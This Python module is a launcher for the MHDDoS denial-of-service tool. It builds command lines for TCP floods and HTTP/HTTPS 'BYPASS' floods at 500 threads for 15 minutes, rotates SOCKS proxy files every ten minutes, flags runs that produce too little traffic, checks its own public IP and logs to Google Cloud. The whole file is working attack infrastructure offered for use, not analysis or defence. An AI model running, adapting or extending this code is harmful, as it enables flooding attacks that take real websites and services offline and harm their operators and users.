import logging
import os
import subprocess
import sys
from contextlib import suppress
from time import time

from PyRoxy import Tools as ProxyTools
from google.cloud.logging import Client as GcpLoggingClient
from requests import get


LOW_TRAFFIC = 15555
LOW_TRAFFIC_BPS = 2 ** 10

RPC = "100"
THREADS = "500"
SECONDS = str(15 * 60)


def setup_logger(name):
    try:
        gcp_logging_client = GcpLoggingClient()
        gcp_logging_client.setup_logging()
        gcp_exception = None
    except Exception as exception:
        gcp_exception = exception
    logging.basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
                        datefmt="%H:%M:%S",
                        level="INFO")
    logger = logging.getLogger(name)
    logger.addHandler(logging.StreamHandler(sys.stdout))
    if gcp_exception:
        logger.exception("Google Cloud Logging failed to initialize", exc_info=gcp_exception)
    return logger


def get_my_ip():
    for f in [
        lambda: get('https://api.my-ip.io/ip', timeout=.1).text,
        lambda: get('https://ipwhois.app/json/', timeout=.1).json()["ip"],
        lambda: get('https://ipinfo.io/json', timeout=.1).json()["ip"],
        lambda: ProxyTools.Patterns.IP.search(get('http://checkip.dyndns.org/', timeout=.1).text),
        lambda: ProxyTools.Patterns.IP.search(get('https://spaceiran.com/myip/', timeout=.1).text),
        lambda: get('https://ip.42.pl/raw', timeout=.1).text,
    ]:
        with suppress(Exception):
            return f()
    raise Exception("Unable to retrieve my IP")


class Args:
    START = subprocess.check_output(
        ["git", "rev-parse", "--show-toplevel"],
        text=True,
        cwd=os.path.dirname(__file__),
    ).strip() + "/start.py"

    @staticmethod
    def tcp(target):
        return Args.START, "TCP", target, THREADS, SECONDS, "0", Args.proxy_file()

    @staticmethod
    def _http(target, socks, method="BYPASS"):
        return Args.START, method, target, "0", THREADS, socks, RPC, SECONDS

    @staticmethod
    def http(target, **kwargs):
        return Args._http("http://" + target, Args.proxy_file(), **kwargs)

    @staticmethod
    def https(target, **kwargs):
        return Args._http("https://" + target, Args.proxy_file(), **kwargs)

    # @staticmethod
    # def http_vpn(target):
    #     return Args._http(target, "sock-zero.txt")

    @staticmethod
    def proxy_file():
        t = int(time()) // (10 * 60)
        return f"sock-{t}.txt"


def run_mhddos(logger, args):
    logger.info("Spawning %s...", (args,))
    if subprocess.call(args) == LOW_TRAFFIC:
        logger.warning("Low traffic")
        return False
    logger.info("Done!")
    return True
